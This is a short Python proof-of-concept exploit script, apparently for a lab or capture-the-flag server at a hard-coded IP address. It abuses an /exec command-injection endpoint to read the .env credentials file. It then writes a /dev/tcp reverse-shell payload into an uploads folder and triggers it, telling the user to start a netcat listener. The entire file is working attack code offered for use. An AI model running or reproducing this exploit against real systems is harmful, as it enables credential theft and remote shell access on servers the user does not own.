#!/usr/bin/env python3

"""
PoC Exploit for Hack The UmmIt Lab Server (Info)
"""

import requests
import random
import string
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()

TARGET = "http://152.42.255.103:8080"
LHOST = "Your IP"
LPORT = 4444

def exploit():
    print("Hack The UmmIt - PoC Exploit")
    
    session = requests.Session()
    
    print("\n[*] Step 1: Reading credentials from .env...")
    url = f"{TARGET}/exec?cmd={quote('cat .env')}"
    response = session.get(url)
    print(f"[+] .env content:\n{response.text}\n")
    
    print("\n[*] Step 2: Writing reverse shell via /exec...")
    
    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    filename = f"rev_{random_suffix}.sh"
    shell_payload = f"sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    
    print(f"[+] Filename: {filename}")
    print(f"[+] Payload: {shell_payload}")
    
    write_cmd = f"echo '{shell_payload}' > uploads/{filename}"
    write_url = f"{TARGET}/exec?cmd={quote(write_cmd)}"
    
    print(f"[+] Writing file via: {write_url}")
    response = session.get(write_url)
    print(f"[+] Write response: {response.status_code}")
    
    verify_cmd = f"ls -la uploads/ && cat uploads/{filename}"
    verify_url = f"{TARGET}/exec?cmd={quote(verify_cmd)}"
    response = session.get(verify_url)
    print(f"\n[+] Verification:\n{response.text}\n")
    
    print("[*] Step 3: Triggering reverse shell...")
    print(f"[!] Make sure nc -lvnp {LPORT} is running!\n")
    
    cmd = f"cd uploads; bash {filename}"
    trigger_url = f"{TARGET}/exec?cmd={quote(cmd)}"
    print(f"[+] Triggering with: {filename}")
    print(f"[+] URL: {trigger_url}")
    
    try:
        session.get(trigger_url, timeout=3)
    except:
        print("[+] Shell triggered! Check your nc listener.")
    
    print("\n[+] Done!")


if __name__ == "__main__":
    exploit()